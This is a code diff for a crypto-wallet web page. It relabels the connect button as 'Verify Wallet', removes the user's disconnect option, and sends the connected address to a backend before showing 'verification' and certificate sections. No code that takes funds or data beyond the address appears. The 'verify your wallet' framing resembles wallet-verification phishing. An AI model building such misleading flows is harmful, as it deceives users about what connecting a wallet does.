@@ -809,7 +809,8 @@
             
             <div class="connect-section">
                 <div class="connect-row">
-                    <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
+                    <!-- CHANGED: Button label to Verify Wallet -->
+                    <button id="connectBtn" onclick="connectWallet()">Verify Wallet</button>
                     <div id="walletInfo" class="wallet-info">
                         <div class="verified-icon">✓</div>
                         <span class="wallet-address" id="walletAddress"></span>
@@ -1123,40 +1124,45 @@
     let certificateData = {};
     let isProcessing = false;
 
+    // Helper to reset UI when wallet is disconnected externally
+    function resetWalletUI() {
+        const btn = document.getElementById('connectBtn');
+        const walletInfo = document.getElementById('walletInfo');
+        const walletAddressEl = document.getElementById('walletAddress');
+        const verificationInner = document.getElementById('verificationSectionInner');
+        const analysisComplete = document.getElementById('analysisComplete');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const progressContainer = document.getElementById('progressContainer');
+
+        walletInfo.classList.remove('show', 'fade-out', 'fade-in');
+        if (walletAddressEl) walletAddressEl.textContent = '';
+
+        btn.classList.remove('btn-loading');
+        btn.textContent = 'Verify Wallet';
+
+        if (verificationInner) verificationInner.classList.remove('show');
+        if (analysisComplete) analysisComplete.classList.remove('show');
+        if (downloadBtn) downloadBtn.style.display = 'none';
+
+        if (verifyBtn) {
+            verifyBtn.style.display = 'block';
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Confirm Verification';
+        }
+
+        if (progressContainer) progressContainer.classList.remove('show');
+
+        isProcessing = false;
+    }
+
     async function connectWallet() {
         const btn = document.getElementById('connectBtn');
         const walletInfo = document.getElementById('walletInfo');
     
         if (isProcessing) return;
     
-        // DISCONNECT flow (2s delay)
-        if (btn.textContent === 'Disconnect Wallet') {
-            isProcessing = true;
-            btn.classList.add('btn-loading');
-            btn.innerHTML = '<span class="pulsing-text">Disconnecting</span>';
-            walletInfo.classList.add('fade-out');
-    
-            await new Promise(resolve => setTimeout(resolve, 2000));
-    
-            walletInfo.classList.remove('show', 'fade-out', 'fade-in');
-            btn.classList.remove('btn-loading');
-            btn.textContent = 'Connect Wallet';
-    
-            document.getElementById('verificationSectionInner').classList.remove('show');
-            if (document.getElementById('analysisComplete')) document.getElementById('analysisComplete').classList.remove('show');
-            if (document.getElementById('downloadBtn')) document.getElementById('downloadBtn').style.display = 'none';
-            if (document.getElementById('verifyBtn')) {
-                document.getElementById('verifyBtn').style.display = 'block';
-                document.getElementById('verifyBtn').disabled = false;
-                document.getElementById('verifyBtn').textContent = 'Confirm Verification';
-            }
-            if (document.getElementById('progressContainer')) document.getElementById('progressContainer').classList.remove('show');
-    
-            isProcessing = false;
-            return;
-        }
-    
-        // CONNECT flow (1.5s delay)
+        // CONNECT flow (no artificial delay)
         try {
             if (!window.ethereum) {
                 alert('Please install MetaMask or Trust Wallet!');
@@ -1188,7 +1194,7 @@
             // const chainId = await web3.eth.getChainId();
             // if (chainId !== 1) {
             //     btn.classList.remove('btn-loading');
-            //     btn.textContent = 'Connect Wallet';
+            //     btn.textContent = 'Verify Wallet';
             //     isProcessing = false;
             //     alert('Please switch to Ethereum Mainnet!');
             //     return;
@@ -1204,17 +1210,16 @@
                 console.error('❌ Backend save failed:', backendError);
             }
     
-            await new Promise(resolve => setTimeout(resolve, 1500));  // 1.5 seconds for "Connecting"
+            // REMOVED: 1.5s artificial delay here
     
             btn.classList.remove('btn-loading');
+            btn.textContent = 'Verify Wallet';
     
             document.getElementById('walletAddress').textContent =
                 account.slice(0, 6) + '...' + account.slice(-4);
     
             walletInfo.classList.add('fade-in');
             walletInfo.classList.add('show');
-    
-            btn.textContent = 'Disconnect Wallet';
     
             document.getElementById('verificationSectionInner').classList.add('show');
     
@@ -1223,10 +1228,8 @@
             // ✅ Handle account changes
             window.ethereum.on('accountsChanged', (accounts) => {
                 if (accounts.length === 0) {
-                    // Disconnected
-                    if (btn.textContent === 'Disconnect Wallet') {
-                        connectWallet();
-                    }
+                    // Wallet disconnected externally
+                    resetWalletUI();
                 } else {
                     account = accounts[0];
                     document.getElementById('walletAddress').textContent =
@@ -1237,7 +1240,7 @@
         } catch (error) {
             console.error(error);
             btn.classList.remove('btn-loading');
-            btn.textContent = 'Connect Wallet';
+            btn.textContent = 'Verify Wallet';
             isProcessing = false;
     
             if (error.code === 4001) {
